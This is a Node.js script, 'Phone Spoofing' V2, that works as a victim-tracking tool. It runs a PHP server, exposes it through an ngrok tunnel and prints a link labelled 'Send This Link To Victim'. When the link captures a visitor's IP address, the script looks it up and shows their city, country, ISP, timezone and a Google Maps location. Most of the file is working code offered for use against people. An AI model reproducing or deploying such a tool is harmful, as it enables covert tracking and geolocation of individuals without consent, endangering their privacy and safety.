// Copyright© 2019 By Fajar Firdaus

// Some depencies
var cmd = require('shelljs');
var f = require('fs');
var r = require('readline');
var c = require('colors');
var req = require("request");
var loading = require("ora");
var style = require("chalk");
var notif = require("beeper");
var check = require("log-symbols")
var cow = require("cowsay")

// Cowsay :)
console.log(cow.say({
	text : "Hello Users :)",
	e : "o0",
	T : "V"
}))

console.log(style.bgBlack(check.warning, "[ Phone Spoofing By Fajar Firdaus ]"))
console.log(c.rainbow("[!] Version V2"))
console.log(c.rainbow("[:———————————————————:]"))
console.log(style.bgBlue("[Coder] Fajar Firdaus"))
console.log(style.bgBlue("[Fb] Fajar Firdaus"))
console.log(style.bgBlue("[IG] @kernel024"))
console.log(style.bgBlue("[Twitter] @kernel024"))
console.log(c.rainbow("[:———————————————————:]"))

// Create user input interface

async function run(){

// Create php local server
await cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");

// Make online php server by port forwarding
await cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");

console.log(style.bgBlue("[/] Please Wait... :)"))


// Tell user if server already start
console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")));

loading("Listening...\n\n").start();
f.watchFile("result.txt", function(current, previous){
var a = f.readFileSync("result.txt", "utf8");
var ipvictim = a.substr(7, 13);
req("http://ip-api.com/json/" + ipvictim, function(error, response, body){
var js = JSON.parse(body);
    console.log(c.red("\n[!] Type Ctrl + c To Exit"))
    console.log(style.cyan(check.success, "[IP] : " + ipvictim));
    notif(3);
    console.log(style.green("[:–––––––––––––––––––:]"))
    console.log(style.white(check.warning, "{ City } > " + js["city"]));
    console.log(style.white(check.warning, "{ Country } > " + js["country"]));
    console.log(style.white(check.warning, "{ ISP } > " + js["as"]));
    console.log(style.white(check.warning, "{ Timezone } > " + js["timezone"]));
    console.log(style.white(check.warning, "{ Google Maps } > " + "https://www.google.com/maps/place/" + js['lat'] + ', ' + js['lon']));
    console.log(style.white(check.warning, "{ IP } > " + js["query"]));
    console.log(style.green("[:–––––––––––––––––––:]"));

});
});

}

run();
